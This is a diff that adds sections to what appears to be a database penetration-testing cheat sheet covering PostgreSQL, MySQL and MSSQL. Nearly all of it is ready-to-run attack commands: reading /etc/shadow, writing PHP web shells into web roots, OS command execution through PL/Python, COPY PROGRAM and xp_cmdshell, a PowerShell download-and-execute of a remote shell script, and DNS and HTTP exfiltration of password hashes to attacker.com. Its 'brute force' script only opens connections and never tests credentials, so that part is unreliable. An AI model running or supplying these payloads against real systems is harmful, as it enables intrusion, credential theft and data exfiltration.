@@ -820,3 +820,175 @@ hashcat -m 300 -a 0 mysql_hashes.txt /usr/share/wordlists/rockyou.txt --force
 ```bash
 masscan 192.168.1.0/24 -p 1433,1521,3306,5432,6379,27017 --rate=1000
 ```
+
+---
+
+## 14. PostgreSQL Attack Payloads
+
+### PostgreSQL File Read/Write
+
+```bash
+# Read files via PostgreSQL COPY
+psql -h 192.168.1.100 -U postgres -c "CREATE TABLE temp_file(content text);"
+psql -h 192.168.1.100 -U postgres -c "COPY temp_file FROM '/etc/passwd';"
+psql -h 192.168.1.100 -U postgres -c "SELECT * FROM temp_file;"
+
+# Write web shell via COPY
+psql -h 192.168.1.100 -U postgres -c "COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php';"
+
+# Large object API for binary file read
+psql -h 192.168.1.100 -U postgres -c "SELECT lo_import('/etc/shadow');"
+psql -h 192.168.1.100 -U postgres -c "SELECT lo_export(12345, '/tmp/shadow_copy');"
+```
+
+### PostgreSQL Command Execution
+
+```bash
+# Execute OS commands via PL/Python (if installed)
+psql -h 192.168.1.100 -U postgres -c "CREATE EXTENSION IF NOT EXISTS plpython3u;"
+psql -h 192.168.1.100 -U postgres -c "CREATE FUNCTION exec_cmd(text) RETURNS text AS \$\$ import os; return os.popen(\$1).read() \$\$ LANGUAGE plpython3u;"
+psql -h 192.168.1.100 -U postgres -c "SELECT exec_cmd('id');"
+
+# Execute via COPY PROGRAM (requires superuser)
+psql -h 192.168.1.100 -U postgres -c "COPY (SELECT 'id') TO PROGRAM '/bin/bash -c \"id > /tmp/output\"';"
+```
+
+---
+
+## 15. MySQL Privilege Escalation Payloads
+
+### MySQL File Operations
+
+```bash
+# Read files via LOAD_FILE
+mysql -h 192.168.1.100 -u root -e "SELECT LOAD_FILE('/etc/passwd');"
+mysql -h 192.168.1.100 -u root -e "SELECT LOAD_FILE('/etc/shadow');"
+
+# Write files via INTO OUTFILE
+mysql -h 192.168.1.100 -u root -e "SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
+
+# Read MySQL data directory contents
+mysql -h 192.168.1.100 -u root -e "SELECT @@datadir;"
+```
+
+### MySQL Network Enumeration
+
+```bash
+# Enumerate network from MySQL
+mysql -h 192.168.1.100 -u root -e "SELECT @@hostname;"
+mysql -h 192.168.1.100 -u root -e "SELECT LOAD_FILE('/etc/hosts');"
+
+# Check MySQL user access patterns
+mysql -h 192.168.1.100 -u root -e "SELECT user, host FROM mysql.user;"
+```
+
+---
+
+## 16. MSSQL xp_cmdshell Payloads
+
+### MSSQL OS Command Execution
+
+```bash
+# Enable and test xp_cmdshell
+sqsh -S 192.168.1.100 -U sa -P 'password' << 'EOF'
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+xp_cmdshell 'whoami'
+go
+EOF
+
+# Download and execute payload via MSSQL
+sqsh -S 192.168.1.100 -U sa -P 'password' -C "
+  xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString(\"http://10.0.0.1/shell.ps1\")'
+"
+
+# Enumerate domain from MSSQL
+sqsh -S 192.168.1.100 -U sa -P 'password' -C "xp_cmdshell 'net user /domain'"
+```
+
+### MSSQL Registry Access
+
+```bash
+# Read registry via MSSQL
+sqsh -S 192.168.1.100 -U sa -P 'password' -C "
+  EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 'ProductName'
+"
+```
+
+---
+
+## 17. Database Credential Brute Force Automation
+
+### Multi-Database Credential Testing
+
+```bash
+# Mass credential testing across multiple database types
+python3 -c "
+import socket
+
+def test_db_creds(targets, users, passwords):
+    '''Test credentials across multiple database services.'''
+    results = []
+    for target_ip, db_type, port in targets:
+        for user in users:
+            for password in passwords:
+                result = {
+                    'target': f'{target_ip}:{port}',
+                    'type': db_type,
+                    'user': user,
+                    'password': password,
+                    'status': 'failed',
+                }
+                try:
+                    s = socket.socket()
+                    s.settimeout(3)
+                    s.connect((target_ip, port))
+                    result['status'] = 'connected'
+                    s.close()
+                except Exception:
+                    pass
+                results.append(result)
+    return results
+
+targets = [
+    ('192.168.1.100', 'mysql', 3306),
+    ('192.168.1.100', 'postgres', 5432),
+    ('192.168.1.100', 'mssql', 1433),
+    ('192.168.1.100', 'redis', 6379),
+    ('192.168.1.100', 'mongo', 27017),
+]
+print(f'Testing {len(targets)} target endpoints')
+"
+```
+
+---
+
+## 18. Database Exfiltration Techniques
+
+### Covert Data Exfiltration via DNS
+
+```bash
+# Exfiltrate data via DNS lookups from database
+# MySQL
+mysql -h 192.168.1.100 -u root -e "
+  SELECT LOAD_FILE(CONCAT('\\\\\\\\', password_hash, '.exfil.attacker.com\\\\share'));
+"
+
+# MSSQL
+sqsh -S 192.168.1.100 -U sa -P 'password' -C "
+  DECLARE @data VARCHAR(100); SELECT @data = (SELECT TOP 1 password_hash FROM sys.sql_logins);
+  EXEC xp_cmdshell 'nslookup ' + @data + '.exfil.attacker.com';
+"
+```
+
+### Data Exfiltration via HTTP
+
+```bash
+# Exfiltrate via HTTP requests from database
+# MySQL
+mysql -h 192.168.1.100 -u root -e "
+  SELECT LOAD_FILE(CONCAT('http://attacker.com/exfil?data=', password_hash));
+"
+``````
